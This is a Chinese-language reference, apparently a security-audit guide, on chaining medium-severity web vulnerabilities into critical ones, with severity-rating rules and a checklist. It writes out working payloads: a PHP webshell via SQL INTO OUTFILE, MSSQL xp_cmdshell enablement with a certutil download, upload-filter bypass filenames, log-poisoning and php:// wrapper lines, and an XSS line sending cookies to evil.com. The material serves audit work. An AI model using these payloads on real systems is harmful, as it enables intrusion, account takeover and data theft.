# 漏洞链组合利用逻辑

## 核心原则

**两个中危漏洞的组合可能等于一个严重漏洞。** 审计时必须评估漏洞间的联动效应，不能孤立看待每个漏洞。

## 漏洞等级评分调整规则

```
单漏洞评级 → 组合后评级调整:
  中危 + 中危 = 高危 (大多数组合)
  中危 + 高危 = 严重 (常见)
  高危 + 高危 = 严重 (几乎总是)
  低危 × 3  = 中危 (批量低危组合)
```

---

## 链1: SSRF → RCE / 内网沦陷

### SSRF → Redis → RCE
```
条件:
  1. SSRF 可打内网 (gopher/dict 协议或 CRLF 注入)
  2. 内网 Redis 无密码或弱密码
  3. SSRF 无协议白名单限制

链:
  SSRF(file:///etc/hosts) → 内网探测
    → SSRF(gopher://127.0.0.1:6379) → Redis 写 crontab
      → RCE

检测方法:
  1. 确认 URL 参数是否可控 → rg "openConnection|openStream|HttpClient|file_get_contents"
  2. 确认是否有协议白名单 → 查找 allowed_protocols / allowed_hosts
  3. 如无白名单 → 即使用户认为是"仅HTTP"，gopher 协议可能可用
  4. 使用动态调试 watch URL.openConnection 观察参数

影响升级: 中危SSRF → 严重RCE
```

### SSRF → 云元数据 → 凭证窃取
```
条件:
  1. 目标部署在云环境 (AWS/GCP/Azure/阿里云)
  2. SSRF 可访问 169.254.169.254 等元数据地址
  3. 元数据服务未限制访问

链:
  SSRF → 169.254.169.254/latest/meta-data/iam/security-credentials/
    → 获取临时凭证 → 云账号接管

检测: 发送 SSRF 请求到云元数据地址，观察响应
影响升级: 低危SSRF → 严重云账号接管
```

### SSRF → 内网未授权服务 → RCE
```
链:
  SSRF(内网扫描) → 发现未授权的 Jenkins/Solr/Elasticsearch
    → Jenkins /script 未授权 → Groovy Script RCE
    → Solr /solr/admin/cores 未授权 → 配置修改 → RCE
    → Elasticsearch /_search 未授权 → 数据泄露

影响升级: 中危SSRF → 严重RCE/数据泄露
```

---

## 链2: SQL注入 → RCE

### SQLi → MySQL UDF/写文件 → RCE
```
条件:
  1. SQL注入可 UNION SELECT
  2. MySQL 运行用户有 FILE 权限
  3. 知道 web 目录路径
  4. secure_file_priv 为空

链:
  SQL注入 UNION SELECT → SELECT @@datadir → 获取MySQL目录
    → SELECT "<?php eval($_POST[1]);?>" INTO OUTFILE "/var/www/html/shell.php"
      → webshell → RCE

检测:
  1. 验证 SQL 注入 (错误回显 / 布尔盲注 / 时间盲注)
  2. 确认 secure_file_priv 值: SELECT @@secure_file_priv
  3. 确认 web 路径: 从错误信息、配置文件、框架默认路径获取

影响升级: 严重SQLi → 严重RCE (执行层面升级)
```

### SQLi → MSSQL xp_cmdshell → RCE
```
链:
  SQL注入 → EXEC sp_configure 'show advanced options',1
    → RECONFIGURE → EXEC sp_configure 'xp_cmdshell',1
      → EXEC xp_cmdshell 'certutil -urlcache ...'
        → 下载后门 → RCE

影响升级: 严重SQLi → 严重RCE
```

### SQLi → PostgreSQL COPY FROM → RCE
```
链:
  SQL注入 → CREATE TABLE cmd(cmd_output text)
    → COPY cmd FROM PROGRAM 'id'
      → SELECT * FROM cmd → 命令执行结果回显 → RCE

影响升级: 严重SQLi → 严重RCE
```

---

## 链3: 文件上传 → RCE

### 无后缀限制 + 任意目录 → webshell
```
条件:
  1. 文件上传无扩展名白名单
  2. 上传目录在 web 根目录下
  3. 上传目录允许脚本执行

链:
  上传 shell.jsp → 直接访问 /uploads/shell.jsp → webshell → RCE
```

### 后缀黑名单 + 解析漏洞 → webshell
```
条件:
  1. 仅黑名单过滤 (禁止 .php/.jsp/.aspx)
  2. 服务器存在解析漏洞或配置缺陷

PHP绕过:
  shell.php5 / shell.phtml / shell.phar / shell.shtml
  shell.php.  (Windows尾随点)
  shell.php::$DATA (Windows NTFS)
  shell.php%00.jpg (空字节截断)

Java绕过:
  shell.jsp;.jpg (IIS + Tomcat)
  shell.jsp%00.jpg (空字节)

.NET绕过:
  shell.aspx;.jpg (IIS)
  shell.asmx (未被过滤的扩展)
  shell.svc (WCF)

Apache绕过:
  shell.php.xxx (AddType不匹配但handler匹配)
  .htaccess: AddType application/x-httpd-php .jpg → 上传图片马

影响升级: 高危文件上传 → 严重RCE
```

### 仅允许图片 + 图片马 + LFI → RCE
```
条件:
  1. 文件上传通过内容检查（允许图片）
  2. 存在 LFI (文件包含漏洞)

链:
  制作图片马 (exiftool -Comment="<?php system(\$_GET[1]);?>" img.jpg)
    → 上传图片马
      → LFI包含该文件: ?page=uploads/img.jpg → PHP执行 → RCE

影响升级: 低危(图片上传) + 高危(LFI) = 严重RCE
```

### 文件上传 + 路径遍历 → 任意目录写
```
条件:
  1. 文件上传文件名可控
  2. 文件名未过滤 ../

链:
  filename="../../../webapps/ROOT/shell.jsp" → 写到web根目录 → RCE

影响升级: 高危文件上传 → 严重RCE
```

---

## 链4: LFI/路径遍历 → RCE

### LFI + 日志污染 → RCE
```
条件:
  1. LFI 可读取任意文件
  2. Web 日志路径已知或可猜测

链:
  HTTP请求注入: GET /<?php system('id');?> HTTP/1.1 → 写入access.log
    → LFI包含: ?page=/var/log/apache2/access.log → PHP执行 → RCE

其他日志路径:
  Linux: /var/log/apache2/access.log, /var/log/nginx/access.log
  Windows: C:\xampp\apache\logs\access.log
  SSH: /var/log/auth.log (注入用户名)
  Mail: /var/mail/www-data
```

### LFI + /proc/self/environ → RCE
```
条件:
  1. LFI 可读取 /proc/self/environ
  2. User-Agent 等请求头可在 /proc/self/environ 中查看

链:
  User-Agent: <?php system('id');?>
    → /proc/self/environ → PHP 执行 → RCE
```

### LFI + PHP Wrapper → RCE
```
条件:
  1. allow_url_include=On
  2. 可以访问远程服务器

链:
  ?page=php://input + POST: <?php system('id');?> → RCE
  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg== → RCE
  ?page=expect://id → RCE (expect扩展)
  ?page=phar://uploads/img.jpg → 反序列化RCE

影响升级: 高危LFI → 严重RCE
```

---

## 链5: XSS → 账户接管

### XSS → Session窃取 → 账户接管
```
条件:
  1. 存在存储型XSS或可传播的反射型XSS
  2. Cookie 未设置 HttpOnly (或可使用 document.cookie)
  3. Session 无 IP/UA 绑定

链:
  存储型XSS(留言板/评论/个人资料) → 管理员查看
    → <script>new Image().src='http://evil.com/?'+document.cookie</script>
      → 窃取 Session → 管理员账户接管 → 后台RCE/数据泄露

影响升级: 低危XSS → 高危账户接管
```

### XSS + CSRF → 蠕虫
```
条件:
  1. 存储型XSS
  2. 关键操作无 CSRF Token 或可被 XSS 读取
  3. 同一Origin下有关键操作 (修改密码/转账/删除)

链:
  XSS → fetch('/change_password', {method:'POST', body:'newpass=hacked'})
    → 任何人查看XSS页面 → 密码被修改 → 账户接管

影响升级: 中危XSS → 高危批量账户接管
```

### XSS → 内网代理/端口扫描
```
条件:
  1. 存储型XSS在后台管理页面
  2. 管理员浏览器可访问内网

链:
  XSS → WebSocket/HTTP对内网端口扫描
    → 发现内网服务 → 结合其他漏洞扩大攻击面

影响升级: 低危XSS → 中危内网探测
```

---

## 链6: IDOR + 信息泄露 → 批量数据窃取

### IDOR + 可预测ID → 批量窃取
```
条件:
  1. IDOR 可访问他人资源
  2. 资源ID可预测 (自增/规律/UUID泄露)

链:
  修改 GET /api/user/123/profile → GET /api/user/124/profile
    → 编写脚本遍历1-100000
      → 批量导出用户数据 → 严重数据泄露

检测:
  1. 用两个不同账户登录
  2. 账户A 访问自身资源，记录ID和响应
  3. 账户B 用账户A的ID访问 → 若成功 → IDOR确认
  4. 评估ID可预测性 → if 自增 → 批量风险

影响升级: 中危IDOR → 严重批量数据泄露
```

### IDOR + 权限提升
```
链:
  GET /api/user/me → 返回 {"id":123, "role":"user"}
    → PUT /api/user/123 → {"role":"admin"}
      → 修改自身角色为管理员 → 权限提升

影响升级: 中危IDOR → 严重权限提升
```

---

## 链7: 反序列化 + 信息泄露 → RCE

### 反序列化入口 + 配置文件泄露 → RCE
```
条件:
  1. 存在反序列化入口 (Cookie/参数/请求体)
  2. 已知或可获取框架/组件版本 (pom.xml/web.config泄露)
  3. 信息泄露 (Actuator/phpinfo/错误信息) 暴露 classpath

链:
  信息泄露 → 获取框架版本和依赖组件
    → 匹配已知 gadget chain (ysoserial/phpggc/ysoserial.net)
      → 构造反序列化 payload → RCE

影响升级: 低危信息泄露 → 严重RCE
```

---

## 链8: 认证绕过 + 后台漏洞 → RCE

```
条件1: 认证绕过进入后台
  如: /admin/* 有认证但 /admin/backup/ 无
  如: 修改参数 role=guest → role=admin
  如: JWT alg=none 绕过

条件2: 后台存在高危漏洞
  如: 后台 SQL 注入 (通常比前台严重，因为权限更高)
  如: 后台文件上传/模板编辑/数据库管理

链:
  认证绕过 → 进入后台 → 后台功能(模板编辑) → 写入 webshell → RCE

影响升级: 高危认证绕过 + 中危后台功能 = 严重RCE
```

---

## 链9: XXE → SSRF → 内网攻击

```
条件:
  1. XXE 外带数据或 SSRF
  2. 内网存在未授权服务

链:
  XXE(local DTD) → 读取 /etc/hosts / 网络配置
    → XXE(SSRF) → 内网扫描
      → XXE(SSRF) → 攻击内网弱服务

影响升级: 高危XXE → 严重(内网沦陷)
```

---

## 审计时链检查清单

对每个发现的中/低危漏洞，检查以下是否能形成链:

```
□ SSRF 发现 → 检查内网可达服务、协议限制、云环境
□ SQL注入 → 检查数据库权限、FILE权限、web路径已知性
□ 文件上传 → 检查扩展名过滤、解析器配置、上传路径
□ LFI发现 → 检查日志路径、PHP wrapper可用性、allow_url_include
□ XSS发现 → 检查 Cookie HttpOnly、关键操作CSRF保护、管理员Cookie范围
□ IDOR发现 → 检查ID可预测性、批量操作可行性、权限字段可控性
□ 信息泄露 → 检查泄露内容是否包含凭证/密钥/框架版本
□ 认证绕过 → 检查后台功能是否存在高危操作
□ XXE发现 → 检查能否带外、能否访问内网
□ 反序列化入口 → 检查 classpath 中是否存在已知 gadget
```

## 链评级速查

```
SSRF(gopher/无白名单) + 内网Redis无密码 = 严重
SSRF(云环境) + 元数据可访问 = 严重
SQLi(FILE权限) + web路径已知 = 严重
SQLi(xp_cmdshell) + MSSQL = 严重
文件上传(任意扩展名) + 可访问 = 严重
文件上传(仅图片) + LFI = 严重
LFI + 日志可控 = 严重
LFI + php://input + allow_url_include = 严重
Stored XSS + 无HttpOnly + 管理员访问 = 高危
XSS + CSRF关键操作 = 高危
IDOR + 自增ID = 严重(批量)
认证绕过 + 后台模板编辑 = 严重
信息泄露(版本) + 反序列化入口 = 严重
路径遍历 + 配置文件读取 = 高危(凭证泄露)
XXE(带外) + 内网可达 = 严重
```
